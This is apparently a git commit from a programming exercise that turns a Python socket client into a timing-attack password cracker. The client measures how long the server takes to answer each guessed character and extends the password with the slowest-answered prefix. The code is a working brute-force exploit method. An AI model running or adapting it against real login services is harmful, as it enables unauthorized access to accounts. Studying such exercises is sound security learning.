c2d6a614d7b788251e625fbf61ce32cd46ca38a3
sebastianpaweska <17113509+sebastianpaweska@users.noreply.github.com>
2025-12-08 15:42:47 +0100

    stage5 - time-based vulnerability

--- main.py
+++ main.py
@@ -2,9 +2,12 @@ import socket
 import argparse
 import itertools
 import json
+import time
 from string import ascii_letters, digits
 
+
 CHARACTERS = ascii_letters + digits
+
 
 def find_admin_login(client_socket):
     logins = load_logins()
@@ -25,15 +28,19 @@ def find_admin_login(client_socket):
 
 def find_password(client_socket, login, current_pass = ""):
     password_iter = itertools.product(CHARACTERS)
+    pass_map = {}
     for pwd_tuple in password_iter:
         password = current_pass + "".join(pwd_tuple)
-
         data = {
             "login": login,
             "password": password
         }
+        start = time.perf_counter()
         client_socket.send(json.dumps(data).encode())
         response = client_socket.recv(10240)
+        end = time.perf_counter()
+        total_time = end - start
+        pass_map[password] = total_time
         response = response.decode()
         response_dict = json.loads(response)
 
@@ -42,10 +49,12 @@ def find_password(client_socket, login, current_pass = ""):
             print(json.dumps(login_form))
             client_socket.close()
             return True
-        elif response_dict["result"] == "Exception happened during login":
-            current_pass = password
-            if find_password(client_socket, login, current_pass):
-                return True
+
+    # find longest response (excepton handling on server-side)
+    longest = max(pass_map.items(), key=lambda item: item[1])
+    current_pass = longest[0]
+    if find_password(client_socket, login, current_pass):
+        return True
     return False
 
 def hack(client_socket):
